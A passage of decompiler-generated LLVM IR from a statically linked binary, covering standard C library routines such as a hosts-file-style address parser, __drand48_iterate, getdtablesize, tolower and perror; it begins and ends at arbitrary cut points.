  %v1_10014e6c3 = inttoptr i32 %v0_10014e6c2 to i8*
  %v2_10014e6c4 = load i8, i8* %v1_10014e6c3, align 1
  %v3_10014e6c5 = zext i8 %v2_10014e6c4 to i32
  store i32 %v3_10014e6c5, i32* %r0.global-to-local, align 4
  %v3_10014e707 = icmp eq i8 %v2_10014e6c4, 0
  %v1_10014e748 = mul nuw nsw i32 %v3_10014e6c5, 2
  store i32 %v1_10014e748, i32* @r10, align 4
  br i1 %v3_10014e707, label %dec_label_pc_10014edc, label %dec_label_pc_10014e7c

dec_label_pc_10014edc:                            ; preds = %dec_label_pc_10014ed0.loopexit, %dec_label_pc_10014e6c.preheader, %dec_label_pc_10014e60, %dec_label_pc_10014e54
  %v0_10014edc = load i32, i32* @r29, align 4
  %v1_10014ee0 = mul i32 %v0_10014edc, 4
  store i32 %v1_10014ee0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10014ee8 = load i32, i32* @r30, align 4
  %v3_10014ee8 = add i32 %v2_10014ee8, %v1_10014ee0
  %v4_10014ee8 = inttoptr i32 %v3_10014ee8 to i32*
  store i32 0, i32* %v4_10014ee8, align 4
  %tmp55 = icmp slt i32 %v0_10014edc, 2
  br i1 %tmp55, label %dec_label_pc_10014f90, label %dec_label_pc_10014ef0

dec_label_pc_10014ef0:                            ; preds = %dec_label_pc_10014edc
  %v0_10014ef0 = load i32, i32* @r18, align 4
  %v3_10014ef0 = icmp eq i32 %v0_10014ef0, 1
  br i1 %v3_10014ef0, label %dec_label_pc_10014fa8, label %dec_label_pc_10014ef8

dec_label_pc_10014ef8:                            ; preds = %dec_label_pc_10014ef0
  %v3_10014ef8 = icmp eq i32 %v0_10014ef0, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10014ef8, label %dec_label_pc_10014f04, label %dec_label_pc_10014f30.preheader

dec_label_pc_10014f30.preheader:                  ; preds = %dec_label_pc_10014ef8
  %v1_10014f3023 = load i32, i32* @r29, align 4
  %v2_10014f3024 = icmp sgt i32 %v1_10014f3023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10014f3829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10014f3829, i32* @r3, align 4
  br i1 %v2_10014f3024, label %dec_label_pc_10014f1c, label %dec_label_pc_10014f40

dec_label_pc_10014f04:                            ; preds = %dec_label_pc_10014ef8
  %v0_10014f04 = load i32, i32* @r30, align 4
  %v1_10014f04 = inttoptr i32 %v0_10014f04 to i32*
  %v2_10014f04 = load i32, i32* %v1_10014f04, align 4
  store i32 %v2_10014f04, i32* @r4, align 4
  %v0_10014f08 = load i32, i32* %r15.global-to-local, align 4
  %v2_10014f0c = inttoptr i32 %v0_10014f08 to i8*
  %v3_10014f0c = call i32 @__GI_strcoll(i8* %v2_10014f0c, i32 %v2_10014f04)
  %v3_10014f10 = icmp eq i32 %v3_10014f0c, 0
  br i1 %v3_10014f10, label %dec_label_pc_10014f48, label %dec_label_pc_10014f90

dec_label_pc_10014f1c:                            ; preds = %dec_label_pc_10014f30.preheader, %dec_label_pc_10014f2c
  %v1_10014f1c = phi i32 [ %v1_10014f34, %dec_label_pc_10014f2c ], [ 4, %dec_label_pc_10014f30.preheader ]
  %v0_10014f3831 = phi i32 [ %v0_10014f38, %dec_label_pc_10014f2c ], [ %v0_10014f3829, %dec_label_pc_10014f30.preheader ]
  %v0_10014f1c = load i32, i32* @r30, align 4
  %v2_10014f1c = add i32 %v0_10014f1c, %v1_10014f1c
  %v3_10014f1c = inttoptr i32 %v2_10014f1c to i32*
  %v4_10014f1c = load i32, i32* %v3_10014f1c, align 4
  store i32 %v4_10014f1c, i32* @r4, align 4
  %v2_10014f20 = call i32 @__GI_strcasecmp(i32 %v0_10014f3831, i32 %v4_10014f1c)
  %v3_10014f24 = icmp eq i32 %v2_10014f20, 0
  %v0_10014f40.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014f24, label %dec_label_pc_10014f1c.dec_label_pc_10014f40_crit_edge, label %dec_label_pc_10014f2c

dec_label_pc_10014f2c:                            ; preds = %dec_label_pc_10014f1c
  %v1_10014f2c = add i32 %v0_10014f40.pre, 1
  store i32 %v1_10014f2c, i32* @r31, align 4
  %v1_10014f30 = load i32, i32* @r29, align 4
  %v2_10014f30 = icmp slt i32 %v1_10014f2c, %v1_10014f30
  %v1_10014f34 = mul i32 %v1_10014f2c, 4
  store i32 %v1_10014f34, i32* %r0.global-to-local, align 4
  %v0_10014f38 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10014f38, i32* @r3, align 4
  br i1 %v2_10014f30, label %dec_label_pc_10014f1c, label %dec_label_pc_10014f40

dec_label_pc_10014f1c.dec_label_pc_10014f40_crit_edge: ; preds = %dec_label_pc_10014f1c
  %v1_10014f40.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014f40

dec_label_pc_10014f40:                            ; preds = %dec_label_pc_10014f2c, %dec_label_pc_10014f1c.dec_label_pc_10014f40_crit_edge, %dec_label_pc_10014f30.preheader
  %v1_10014f40 = phi i32 [ %v1_10014f40.pre, %dec_label_pc_10014f1c.dec_label_pc_10014f40_crit_edge ], [ %v1_10014f3023, %dec_label_pc_10014f30.preheader ], [ %v1_10014f30, %dec_label_pc_10014f2c ]
  %v0_10014f40 = phi i32 [ %v0_10014f40.pre, %dec_label_pc_10014f1c.dec_label_pc_10014f40_crit_edge ], [ 1, %dec_label_pc_10014f30.preheader ], [ %v1_10014f2c, %dec_label_pc_10014f2c ]
  %v2_10014f40 = icmp slt i32 %v0_10014f40, %v1_10014f40
  br i1 %v2_10014f40, label %dec_label_pc_10014f48, label %dec_label_pc_10014f90

dec_label_pc_10014f48:                            ; preds = %dec_label_pc_10014f04, %dec_label_pc_10014f40
  %v0_10014f48 = load i32, i32* @r19, align 4
  %v3_10014f48 = icmp eq i32 %v0_10014f48, 2
  br i1 %v3_10014f48, label %dec_label_pc_10014f50, label %dec_label_pc_10014f6c

dec_label_pc_10014f50:                            ; preds = %dec_label_pc_10014f48
  %v0_10014f50 = load i32, i32* @r30, align 4
  %v1_10014f50 = inttoptr i32 %v0_10014f50 to i32*
  %v2_10014f50 = load i32, i32* %v1_10014f50, align 4
  %v0_10014f58 = load i32, i32* @r25, align 4
  store i32 268521312, i32* @lr, align 4
  %v3_10014f5c = inttoptr i32 %v2_10014f50 to i8*
  %v4_10014f5c = call i32 @inet_pton(i32 2, i8* %v3_10014f5c, i32 %v0_10014f58)
  %v2_10014f60 = icmp sgt i32 %v4_10014f5c, 0
  br i1 %v2_10014f60, label %dec_label_pc_10014db0, label %dec_label_pc_10014f8c

dec_label_pc_10014f6c:                            ; preds = %dec_label_pc_10014f48
  %v3_10014f6c = icmp eq i32 %v0_10014f48, 10
  br i1 %v3_10014f6c, label %dec_label_pc_10014f74, label %dec_label_pc_10014f8c

dec_label_pc_10014f74:                            ; preds = %dec_label_pc_10014f6c
  %v0_10014f74 = load i32, i32* @r30, align 4
  %v1_10014f74 = inttoptr i32 %v0_10014f74 to i32*
  %v2_10014f74 = load i32, i32* %v1_10014f74, align 4
  %v0_10014f7c = load i32, i32* @r21, align 4
  store i32 268521348, i32* @lr, align 4
  %v3_10014f80 = inttoptr i32 %v2_10014f74 to i8*
  %v4_10014f80 = call i32 @inet_pton(i32 10, i8* %v3_10014f80, i32 %v0_10014f7c)
  %v2_10014f84 = icmp sgt i32 %v4_10014f80, 0
  br i1 %v2_10014f84, label %dec_label_pc_10014de0, label %dec_label_pc_10014f8c

dec_label_pc_10014f8c:                            ; preds = %dec_label_pc_10014f50, %dec_label_pc_10014f6c, %dec_label_pc_10014f74
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10014f90

dec_label_pc_10014f90:                            ; preds = %dec_label_pc_10014f40, %dec_label_pc_10014f04, %dec_label_pc_10014edc, %dec_label_pc_10014f8c, %dec_label_pc_10014e28
  %v0_10014f90 = load i32, i32* @r24, align 4
  %v0_10014f94 = load i32, i32* @r27, align 4
  %v0_10014f98 = load i32, i32* @r20, align 4
  store i32 268521376, i32* @lr, align 4
  %v3_10014f9c = call i32 @fgets(i32 %v0_10014f90, i32 %v0_10014f94, i32 %v0_10014f98)
  %v3_10014fa0 = icmp eq i32 %v3_10014f9c, 0
  br i1 %v3_10014fa0, label %dec_label_pc_10014fa8, label %dec_label_pc_10014e38

dec_label_pc_10014fa8:                            ; preds = %dec_label_pc_10014f90, %dec_label_pc_10014ef0, %dec_label_pc_10014e0c
  %v0_10014fa8 = load i32, i32* @r18, align 4
  %v3_10014fa8 = icmp eq i32 %v0_10014fa8, 1
  br i1 %v3_10014fa8, label %dec_label_pc_10014fc0, label %dec_label_pc_10014fb0

dec_label_pc_10014fb0:                            ; preds = %dec_label_pc_10014fa8
  %v0_10014fb0 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10014fb8.514 to i32), i32* @lr, align 4
  %v1_10014fb4 = inttoptr i32 %v0_10014fb0 to i16*
  %v2_10014fb4 = call i32 @__GI_fclose(i16* %v1_10014fb4)
  br label %dec_label_pc_10014fc0

dec_label_pc_10014fbc:                            ; preds = %dec_label_pc_10014d74, %dec_label_pc_10014d44, %dec_label_pc_10014d3c, %dec_label_pc_10014d30, %dec_label_pc_10014d20, %dec_label_pc_10014d08, %dec_label_pc_10014cf8
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10014fc0

dec_label_pc_10014fc0:                            ; preds = %dec_label_pc_10014fa8, %dec_label_pc_10014fb0, %dec_label_pc_10014da0, %dec_label_pc_10014fbc
  store i32 %v0_10014cbc, i32* %r0.global-to-local, align 4
  %v0_10014fc4 = load i32, i32* @r26, align 4
  ret i32 %v0_10014fc4

; uselistorder directives
  uselistorder i32 %v0_10014f38, { 1, 0 }
  uselistorder i32 %v1_10014f2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10014ee0, { 1, 0 }
  uselistorder i32 %v0_10014edc, { 1, 0 }
  uselistorder i32 %v0_10014e6c2, { 1, 0 }
  uselistorder i32 %v1_10014eb4, { 1, 0 }
  uselistorder i32 %v1_10014eb415, { 1, 0 }
  uselistorder i32 %v1_10014e98, { 1, 0 }
  uselistorder i32 %v0_10014e90, { 1, 0, 2 }
  uselistorder i32 %v1_10014e74, { 1, 0 }
  uselistorder i32 %v2_10014e40, { 1, 0 }
  uselistorder i32 %v0_10014d30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014d08.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10014cd4, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 12, 0, 13, 30, 20, 14, 15, 28, 16, 17, 19, 18, 29, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 23, 24, 25, 26, 27 }
  uselistorder i32 34, { 7, 8, 4, 5, 0, 1, 6, 9, 10, 11, 2, 3 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 4, 3, 2 }
  uselistorder i32 10, { 8, 22, 23, 24, 25, 26, 27, 28, 16, 17, 13, 14, 15, 30, 29, 31, 32, 4, 33, 2, 34, 3, 35, 1, 5, 9, 38, 10, 20, 11, 21, 19, 6, 36, 37, 18, 12, 0, 7 }
  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 1, 7, 6, 5, 0, 4, 3, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 6, { 18, 19, 20, 21, 22, 12, 13, 14, 15, 6, 7, 27, 16, 0, 1, 2, 17, 8, 3, 23, 24, 4, 25, 9, 26, 5, 10, 11 }
  uselistorder i32* @global_var_1002c2d0, { 0, 3, 1, 4, 5, 2, 6 }
  uselistorder i32 35, { 1, 3, 2, 4, 0 }
  uselistorder i32 ()* @__errno_location, { 57, 116, 115, 114, 56, 42, 40, 55, 38, 37, 29, 112, 50, 121, 120, 119, 118, 35, 113, 34, 48, 24, 23, 22, 111, 28, 31, 30, 8, 64, 63, 62, 61, 110, 109, 108, 25, 26, 101, 13, 69, 49, 3, 2, 27, 33, 43, 0, 53, 52, 17, 68, 60, 12, 11, 10, 74, 59, 21, 81, 78, 77, 82, 80, 54, 51, 73, 107, 7, 20, 86, 106, 105, 87, 39, 9, 36, 72, 67, 41, 4, 66, 65, 104, 58, 32, 16, 6, 5, 1, 103, 102, 100, 19, 18, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 122, 85, 117, 84, 83, 15, 14, 79, 76, 75, 71, 70, 47, 46, 45, 44 }
  uselistorder i32* @r21, { 6, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 16, 17, 18, 19, 4 }
  uselistorder i32* @r22, { 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 0, 1, 2, 3, 20, 21, 4 }
  uselistorder i32 80, { 4, 8, 3, 2, 1, 0, 7, 6, 5 }
  uselistorder i32 48, { 17, 10, 11, 12, 1, 13, 14, 4, 8, 9, 19, 20, 2, 21, 22, 23, 6, 24, 5, 25, 3, 0, 26, 27, 18, 16, 7, 28, 29, 15 }
  uselistorder i32 36, { 9, 10, 11, 12, 13, 14, 15, 16, 5, 6, 3, 20, 1, 2, 17, 18, 19, 7, 4, 8, 0 }
  uselistorder i32 -48, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* @r27, { 37, 38, 39, 40, 41, 42, 1, 43, 44, 45, 46, 13, 14, 7, 15, 3, 2, 47, 48, 49, 50, 16, 17, 18, 19, 113, 114, 98, 99, 55, 0, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 100, 101, 102, 20, 21, 22, 23, 24, 25, 103, 104, 105, 106, 107, 108, 111, 112, 79, 80, 120, 4, 121, 8, 127, 132, 115, 116, 117, 118, 119, 122, 126, 73, 74, 75, 76, 128, 129, 130, 109, 110, 60, 61, 62, 81, 82, 5, 83, 84, 85, 86, 9, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 10, 11, 12, 131, 63, 64, 65, 66, 77, 78, 51, 52, 53, 54, 33, 6, 123, 124, 125, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36 }
  uselistorder i32 -32, { 2, 3, 0, 1 }
  uselistorder i32 32, { 67, 68, 69, 27, 70, 71, 28, 92, 89, 46, 23, 24, 20, 76, 77, 47, 48, 49, 52, 1, 50, 2, 51, 53, 54, 37, 38, 39, 40, 3, 41, 42, 90, 78, 29, 26, 79, 91, 21, 22, 64, 65, 95, 4, 5, 6, 17, 74, 72, 73, 80, 81, 30, 82, 83, 84, 85, 86, 87, 88, 0, 93, 94, 75, 62, 18, 31, 19, 16, 25, 7, 55, 56, 43, 44, 35, 36, 66, 57, 58, 59, 60, 45, 61, 96, 97, 63, 9, 10, 8, 12, 11, 32, 33, 14, 15, 13, 34 }
  uselistorder i32* @r16, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32* @r17, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* @r18, { 4, 5, 6, 7, 8, 1, 9, 10, 0, 11, 2, 3 }
  uselistorder i32* @r19, { 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 1 }
  uselistorder i32* @r20, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 1 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10014fc0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10014f90, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10014f8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014f48, { 1, 0 }
  uselistorder label %dec_label_pc_10014f40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014f1c, { 1, 0 }
  uselistorder label %dec_label_pc_10014edc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10014e6c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10014ebc, { 1, 0 }
  uselistorder label %dec_label_pc_10014e54, { 1, 0 }
  uselistorder label %dec_label_pc_10014e28, { 1, 0 }
  uselistorder label %dec_label_pc_10014e0c, { 1, 0 }
  uselistorder label %dec_label_pc_10014d74, { 1, 0 }
  uselistorder label %dec_label_pc_10014d08, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10014fd8 = load i32, i32* @r4, align 4
  %v1_10014fd8 = add i32 %v0_10014fd8, 14
  %v2_10014fd8 = inttoptr i32 %v1_10014fd8 to i16*
  %v3_10014fd8 = load i16, i16* %v2_10014fd8, align 2
  %v4_10014fd8 = zext i16 %v3_10014fd8 to i32
  store i32 %v4_10014fd8, i32* %r0.global-to-local, align 4
  %v3_10014fe0 = icmp eq i16 %v3_10014fd8, 0
  %v0_10014fe8 = load i32, i32* @r3, align 4
  store i32 %v0_10014fe8, i32* %r31.global-to-local, align 4
  br i1 %v3_10014fe0, label %dec_label_pc_10014ff0, label %dec_label_pc_10015014

dec_label_pc_10014ff0:                            ; preds = %entry
  store i32 5, i32* %r9.global-to-local, align 4
  store i32 -554899859, i32* %r10.global-to-local, align 4
  %v3_10015000 = add i32 %v0_10014fd8, 12
  %v4_10015000 = inttoptr i32 %v3_10015000 to i16*
  store i16 11, i16* %v4_10015000, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10015008 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015008 = load i32, i32* @r4, align 4
  %v2_10015008 = add i32 %v1_10015008, 16
  %v3_10015008 = inttoptr i32 %v2_10015008 to i32*
  store i32 %v0_10015008, i32* %v3_10015008, align 4
  %v0_1001500c = load i32, i32* %r10.global-to-local, align 4
  %v1_1001500c = load i32, i32* @r4, align 4
  %v2_1001500c = add i32 %v1_1001500c, 20
  %v3_1001500c = inttoptr i32 %v2_1001500c to i32*
  store i32 %v0_1001500c, i32* %v3_1001500c, align 4
  %v0_10015010 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015010 = trunc i32 %v0_10015010 to i16
  %v2_10015010 = load i32, i32* @r4, align 4
  %v3_10015010 = add i32 %v2_10015010, 14
  %v4_10015010 = inttoptr i32 %v3_10015010 to i16*
  store i16 %v1_10015010, i16* %v4_10015010, align 2
  %v0_10015014.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10015034.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015014

dec_label_pc_10015014:                            ; preds = %entry, %dec_label_pc_10014ff0
  %v0_10015054 = phi i32 [ %v0_10014fd8, %entry ], [ %v0_10015034.pre, %dec_label_pc_10014ff0 ]
  %v2_10015078 = phi i32 [ %v0_10014fe8, %entry ], [ %v0_10015014.pre, %dec_label_pc_10014ff0 ]
  %v1_10015014 = add i32 %v2_10015078, 4
  %v2_10015014 = inttoptr i32 %v1_10015014 to i16*
  %v3_10015014 = load i16, i16* %v2_10015014, align 2
  %v4_10015014 = zext i16 %v3_10015014 to i32
  store i32 %v4_10015014, i32* %r10.global-to-local, align 4
  %v1_1001501c = add i32 %v2_10015078, 2
  %v2_1001501c = inttoptr i32 %v1_1001501c to i16*
  %v3_1001501c = load i16, i16* %v2_1001501c, align 2
  %v4_1001501c = zext i16 %v3_1001501c to i32
  store i32 %v4_1001501c, i32* %r7.global-to-local, align 4
  %v1_10015024 = inttoptr i32 %v2_10015078 to i16*
  %v2_10015024 = load i16, i16* %v1_10015024, align 2
  %v3_10015024 = zext i16 %v2_10015024 to i32
  store i32 %v4_10015014, i32* %r9.global-to-local, align 4
  %v1_1001502c = mul nuw i32 %v4_1001501c, 65536
  store i32 %v1_1001502c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10015034 = add i32 %v0_10015054, 20
  %v2_10015034 = inttoptr i32 %v1_10015034 to i32*
  %v3_10015034 = load i32, i32* %v2_10015034, align 4
  store i32 %v3_10015024, i32* %r10.global-to-local, align 4
  %v1_1001503c = add i32 %v0_10015054, 16
  %v2_1001503c = inttoptr i32 %v1_1001503c to i32*
  %v3_1001503c = load i32, i32* %v2_1001503c, align 4
  %v2_10015048 = or i32 %v3_10015024, %v1_1001502c
  store i32 %v4_10015014, i32* %r7.global-to-local, align 4
  %v2_10015050 = mul i32 %v3_1001503c, %v2_10015048
  %v1_10015054 = add i32 %v0_10015054, 12
  %v2_10015054 = inttoptr i32 %v1_10015054 to i16*
  %v3_10015054 = load i16, i16* %v2_10015054, align 2
  %v4_10015054 = zext i16 %v3_10015054 to i32
  %v2_10015058 = mul i32 %v3_10015034, %v4_10015014
  %v2_1001505c = zext i32 %v2_10015048 to i64
  %v3_1001505c = zext i32 %v3_10015034 to i64
  %v4_1001505c = mul nuw i64 %v3_1001505c, %v2_1001505c
  %v5_1001505c = udiv i64 %v4_1001505c, 4294967296
  %v6_1001505c = trunc i64 %v5_1001505c to i32
  %v2_10015060 = add i32 %v2_10015050, %v2_10015058
  %v2_10015064 = mul i32 %v3_10015034, %v2_10015048
  %v2_10015068 = add i32 %v2_10015060, %v6_1001505c
  store i32 %v2_10015068, i32* %r9.global-to-local, align 4
  %v2_1001506c = add i32 %v4_10015054, %v2_10015064
  store i32 %v2_1001506c, i32* @r8, align 4
  %v3_1001506c = icmp ult i32 %v2_1001506c, %v2_10015064
  %v4_10015070 = zext i1 %v3_1001506c to i32
  %v5_10015070 = add i32 %v4_10015070, %v2_10015068
  store i32 %v5_10015070, i32* %r7.global-to-local, align 4
  %v1_10015074 = mul i32 %v5_10015070, 65536
  store i32 %v1_10015074, i32* %r0.global-to-local, align 4
  %v1_10015078 = trunc i32 %v2_1001506c to i16
  store i16 %v1_10015078, i16* %v1_10015024, align 2
  %v0_1001507c = load i32, i32* @r8, align 4
  %v1_1001507c = udiv i32 %v0_1001507c, 65536
  %v0_10015080 = load i32, i32* %r7.global-to-local, align 4
  %v0_10015084 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015084 = or i32 %v0_10015084, %v1_1001507c
  store i32 %v2_10015084, i32* @r10, align 4
  %v1_10015088 = trunc i32 %v0_10015080 to i16
  %v2_10015088 = load i32, i32* %r31.global-to-local, align 4
  %v3_10015088 = add i32 %v2_10015088, 4
  %v4_10015088 = inttoptr i32 %v3_10015088 to i16*
  store i16 %v1_10015088, i16* %v4_10015088, align 2
  %v0_1001508c = load i32, i32* @r10, align 4
  %v1_1001508c = trunc i32 %v0_1001508c to i16
  %v2_1001508c = load i32, i32* %r31.global-to-local, align 4
  %v3_1001508c = add i32 %v2_1001508c, 2
  %v4_1001508c = inttoptr i32 %v3_1001508c to i16*
  store i16 %v1_1001508c, i16* %v4_1001508c, align 2
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10015064, { 1, 0 }
  uselistorder i32 %v2_10015048, { 0, 2, 1 }
  uselistorder i32 %v3_10015034, { 0, 2, 1 }
  uselistorder i32 %v1_1001502c, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 20, { 65, 66, 48, 49, 50, 22, 4, 51, 3, 67, 21, 72, 68, 10, 11, 12, 13, 14, 15, 16, 17, 69, 23, 24, 25, 26, 27, 28, 29, 18, 30, 31, 32, 33, 34, 52, 53, 55, 56, 70, 71, 35, 36, 45, 37, 0, 76, 77, 57, 58, 59, 60, 61, 63, 64, 62, 74, 54, 44, 73, 46, 6, 7, 8, 9, 19, 20, 38, 39, 40, 41, 42, 43, 47, 75, 1, 2, 5 }
  uselistorder i32 16, { 123, 124, 84, 20, 85, 86, 21, 87, 88, 4, 89, 90, 5, 91, 22, 46, 125, 141, 23, 24, 16, 43, 126, 6, 7, 38, 39, 40, 41, 92, 93, 127, 128, 42, 8, 15, 0, 129, 94, 104, 105, 33, 34, 130, 44, 45, 47, 48, 131, 49, 50, 25, 51, 52, 53, 132, 26, 35, 36, 133, 134, 54, 55, 56, 57, 58, 59, 144, 95, 96, 97, 98, 109, 110, 111, 112, 113, 114, 115, 135, 136, 137, 138, 139, 140, 145, 116, 13, 81, 60, 78, 61, 17, 106, 107, 161, 162, 163, 164, 99, 100, 117, 118, 119, 120, 121, 122, 146, 147, 148, 101, 9, 102, 103, 76, 142, 27, 62, 63, 64, 65, 149, 150, 151, 152, 157, 158, 159, 160, 153, 154, 155, 14, 66, 67, 83, 1, 2, 10, 31, 11, 18, 32, 12, 68, 69, 156, 3, 70, 71, 72, 73, 74, 75, 37, 143, 77, 28, 79, 80, 19, 29, 82, 30, 108 }
  uselistorder i32 5, { 29, 25, 26, 14, 15, 16, 6, 7, 30, 8, 9, 10, 17, 2, 3, 13, 18, 19, 1, 20, 21, 5, 4, 27, 28, 22, 23, 24, 11, 12, 0 }
  uselistorder i16 0, { 20, 18, 0, 13, 21, 14, 1, 2, 3, 4, 5, 6, 22, 24, 23, 25, 15, 26, 19, 16, 7, 8, 9, 10, 11, 12, 17, 27 }
  uselistorder label %dec_label_pc_10015014, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100150a8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268521652, i32* @lr, align 4
  %v2_100150b0 = call i32 @getrlimit(i32 7, i32 %v2_100150a8)
  %v1_100150b4 = icmp slt i32 %v2_100150b0, 0
  br i1 %v1_100150b4, label %dec_label_pc_100150c4, label %dec_label_pc_100150c0

dec_label_pc_100150c0:                            ; preds = %entry
  %v3_100150c0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100150c4

dec_label_pc_100150c4:                            ; preds = %entry, %dec_label_pc_100150c0
  %v0_100150d0 = phi i32 [ 256, %entry ], [ %v3_100150c0, %dec_label_pc_100150c0 ]
  ret i32 %v0_100150d0

; uselistorder directives
  uselistorder i32 7, { 2, 5, 6, 4, 0, 3, 11, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_100150c4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100150d4 = add i32 %arg1, 128
  %v1_100150d8 = mul i32 %arg1, 2
  %v2_100150dc = icmp ugt i32 %v1_100150d4, 383
  %v0_100150e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100150dc, i32 %v0_100150e0)
  %v3_100150e8 = load i32, i32* bitcast (i32** @global_var_1002c2d8.313 to i32*), align 4
  %v2_100150ec = add i32 %v1_100150d8, %v3_100150e8
  %v3_100150ec = inttoptr i32 %v2_100150ec to i16*
  %v4_100150ec = load i16, i16* %v3_100150ec, align 2
  %v5_100150ec = sext i16 %v4_100150ec to i32
  ret i32 %v5_100150ec

; uselistorder directives
  uselistorder i32 128, { 17, 0, 1, 26, 4, 5, 6, 18, 28, 7, 8, 9, 10, 29, 30, 27, 20, 21, 22, 11, 23, 24, 25, 2, 14, 19, 15, 12, 13, 3, 16 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_100150f4 = load i32, i32* @r3, align 4
  %v3_100150f4 = icmp eq i32 %v0_100150f4, 0
  br i1 %v3_100150f4, label %dec_label_pc_1001511c, label %dec_label_pc_10015104

dec_label_pc_10015104:                            ; preds = %entry
  %v1_10015104 = inttoptr i32 %v0_100150f4 to i8*
  %v2_10015104 = load i8, i8* %v1_10015104, align 1
  %v3_10015108 = icmp eq i8 %v2_10015104, 0
  br i1 %v3_10015108, label %dec_label_pc_1001511c, label %dec_label_pc_10015110

dec_label_pc_10015110:                            ; preds = %dec_label_pc_10015104
  br label %dec_label_pc_10015120

dec_label_pc_1001511c:                            ; preds = %dec_label_pc_10015104, %entry
  br label %dec_label_pc_10015120

dec_label_pc_10015120:                            ; preds = %dec_label_pc_10015110, %dec_label_pc_1001511c
  %v3_10015128 = load i32, i32* @global_var_1002c2b0, align 4
  store i32 %v3_10015128, i32* @r3, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10017574.517 to i32), i32* @r4, align 4
  %v4_10015134 = call i32 @fprintf(i32 %v3_10015128, i32 ptrtoint ([8 x i8]* @global_var_10017574.517 to i32), i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v4_10015134

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10030000.11 to i32), { 5, 28, 29, 30, 1, 2, 31, 32, 4, 3, 33, 34, 6, 35, 36, 37, 18, 0, 38, 7, 19, 8, 39, 9, 20, 21, 40, 41, 42, 22, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 23, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 67, 68, 10, 69, 70, 71, 72, 73, 74, 75, 11, 76, 24, 65, 77, 78, 79, 25, 80, 81, 82, 83, 84, 85, 12, 13, 86, 14, 87, 88, 89, 26, 90, 91, 27, 15, 16, 17 }
  uselistorder label %dec_label_pc_10015120, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_10015144 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10015144, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
